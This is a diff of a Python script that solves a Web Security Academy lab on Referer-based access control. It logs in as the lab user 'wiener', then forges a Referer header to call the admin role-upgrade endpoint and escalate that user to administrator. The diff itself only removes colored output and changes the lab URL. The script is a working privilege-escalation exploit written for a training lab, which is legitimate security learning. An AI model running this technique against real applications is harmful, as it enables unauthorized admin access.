@@ -8,34 +8,33 @@
 #
 ###################################################################
 import requests
-from colorama import Fore
 
 # Change this to your lab URL
-LAB_URL = "https://0a480059049a34b082e0d3b4008c00d6.web-security-academy.net"
+LAB_URL = "https://0a8f001a0438926e812039dc006600b9.web-security-academy.net"
 
 def main():
-    print(Fore.WHITE + "⦗1⦘ Logging in as wiener.. ", end="", flush=True)
+    print("⦗1⦘ Logging in as wiener.. ", end="", flush=True)
 
     data = { "username": "wiener", "password": "peter" }
     login_as_wiener = post_data("/login", data)
         
-    print(Fore.GREEN + "OK")
-    print(Fore.WHITE + "⦗2⦘ Upgrading wiener to be an admin by adding Referer header.. ", end="", flush=True)    
+    print("OK")
+    print("⦗2⦘ Upgrading wiener to be an admin by adding Referer header.. ", end="", flush=True)    
     
     session = login_as_wiener.cookies.get("session") 
     cookies = { "session": session }
     headers = { "Referer": f"{LAB_URL}/admin" }
     fetch("/admin-roles?username=wiener&action=upgrade", cookies=cookies, headers=headers)
 
-    print(Fore.GREEN + "OK")
-    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
+    print("OK")
+    print("🗹 The lab should be marked now as " + "solved")
 
 
 def fetch(path, cookies, headers):
     try:  
         return requests.get(f"{LAB_URL}{path}", cookies=cookies, headers=headers, allow_redirects=False)
     except:
-        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
+        print("⦗!⦘ Failed to fetch " + path + " through exception")
         exit(1)
 
 
@@ -43,7 +42,7 @@ def post_data(path, data):
     try:    
         return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
     except:
-        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
+        print("⦗!⦘ Failed to post data to " + path + " through exception")
         exit(1)
 
         
